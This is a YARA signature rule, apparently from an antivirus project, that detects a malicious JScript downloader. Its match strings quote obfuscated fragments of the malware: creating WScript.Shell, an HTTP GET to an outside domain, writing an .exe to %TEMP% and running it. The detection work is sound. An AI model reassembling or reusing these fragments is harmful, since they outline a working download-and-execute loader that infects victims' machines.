rule sig_20160401_769777a0d2393c3a4f01d880e1645501 {
  meta:
    description = "datamaliciousorder - file 20160401_769777a0d2393c3a4f01d880e1645501.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "36b2839263174748f89b2b6f1bd7a3e6c76ea24d1a12518e868b3a691911ce6f"

  strings:
    $s1  = "var SbOi = function VngEi() {return WScript[YnFz](\"WScript\"+\".Shell\");}(), ZzqZkm = 11;" fullword ascii
    $s2  = "function RmPl(RtJu, RtFx){RwZjt = RwZjt * 1; return RtJu - RtFx;};" fullword ascii
    $s3  = "RrNwx[GqqUx](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (RrNwx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GsaMwn() {return SbOi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"EN6mggDeWu8oBo3c.ex\" + \"e\";};" fullword ascii
    $s6  = "function NxZy(){return DnbKp + \"\";};" fullword ascii
    $s7  = "function CyxUu() {return ((SoQl == true) && (SoQl == AhWv)) ? 1 : RwZjt;};" fullword ascii
    $s8  = "AhWv = true; " fullword ascii
    $s9  = "function ApCe(){return YnFz;};" fullword ascii
    $s10 = "SoQl = true; " fullword ascii
    $s11 = "var AhWv = false;" fullword ascii
    $s12 = "function EfRgc(){return 23;};" fullword ascii
    $s13 = "var CuwEy = new this[\"Date\"]();" fullword ascii
    $s14 = "function YfmIhc()" fullword ascii
    $s15 = "function IhwNx(WqZjk){SbOi[\"R\"+\"un\"](WqZjk, RwZjt, RwZjt);};" fullword ascii
    $s16 = "var SoQl = false;" fullword ascii
    $s17 = "var BafLpr = false;" fullword ascii
    $s18 = "function IoEbm(AtlHxz) {var JqrVg = (1, 2, 3, 4, 5, AtlHxz); return JqrVg;};" fullword ascii
    $s19 = "}while (TjkMhm);" fullword ascii
    $s20 = "return RmPl(KqkUvk, OyEmm);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}